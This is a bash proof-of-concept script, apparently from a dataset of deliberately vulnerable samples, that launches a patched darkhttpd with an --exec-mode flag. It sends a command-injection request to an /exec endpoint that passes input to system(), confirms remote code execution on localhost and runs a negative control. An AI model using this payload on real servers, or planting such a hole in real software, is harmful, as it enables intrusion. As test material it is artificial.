#!/usr/bin/env bash
# PoC for 007_darkhttpd_C1I3S1
# Axes: C1 (single CLI flag gate) / I3 (struct dispatch) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (darkhttpd) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh
#
# Flow note: cmd flows into exec_args_t.cmd, then dispatch_exec() calls system(args->cmd).
# The struct indirection (I3) does not prevent injection.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/darkhttpd"
WWWROOT="/tmp/poc_007_www"
MARKER="/tmp/poc_007_marker"
PORT=18007

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting darkhttpd with --exec-mode on port $PORT..."
"$BINARY" "$WWWROOT" --port "$PORT" --exec-mode --log /dev/null &
SERVER_PID=$!
sleep 0.4

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without --exec-mode ──────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode..."
"$BINARY" "$WWWROOT" --port 19007 --log /dev/null &
SAFE_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:19007/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
